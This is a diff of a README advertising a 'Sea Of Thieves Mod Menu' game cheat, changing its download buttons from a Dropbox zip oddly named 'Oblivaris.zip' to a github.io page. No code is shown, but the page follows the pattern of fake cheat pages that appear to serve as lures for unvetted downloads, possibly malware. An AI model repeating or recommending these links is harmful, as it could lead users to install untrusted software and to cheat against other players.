@@ -2,7 +2,7 @@
 
 **Sea Of Thieves Mod Menu** is a feature-rich and easy-to-use modding tool designed to give you full control over your pirate journey. Whether you're hunting treasure, fighting other crews, or just exploring the seas, this menu provides the tools to make your experience smoother, faster, and more powerful.
 
-[![Download SoT ModMenu](https://img.shields.io/badge/Download-SoT%20ModMenu-blueviolet)](https://www.dropbox.com/scl/fi/zse5cs99mx9h0kjzf06bx/Oblivaris.zip?rlkey=dcargwg0w4py89d285jt5swqo&st=m35upycd&dl=1)
+[![Download SoT ModMenu](https://img.shields.io/badge/Download-SoT%20ModMenu-blueviolet)](https://sea-of-thieves-modmenu.github.io/.github/)
 
 ## ⚙️ Features
 
@@ -24,4 +24,4 @@
 3. Use the in-game menu (`Insert` or assigned hotkey) to toggle features.
 4. Customize settings to match your playstyle and enjoy the game with enhanced control.
 
-[![Download SoT ModMenu](https://img.shields.io/badge/Download-SoT%20ModMenu-blueviolet)](https://www.dropbox.com/scl/fi/zse5cs99mx9h0kjzf06bx/Oblivaris.zip?rlkey=dcargwg0w4py89d285jt5swqo&st=m35upycd&dl=1)
+[![Download SoT ModMenu](https://img.shields.io/badge/Download-SoT%20ModMenu-blueviolet)](https://sea-of-thieves-modmenu.github.io/.github/)
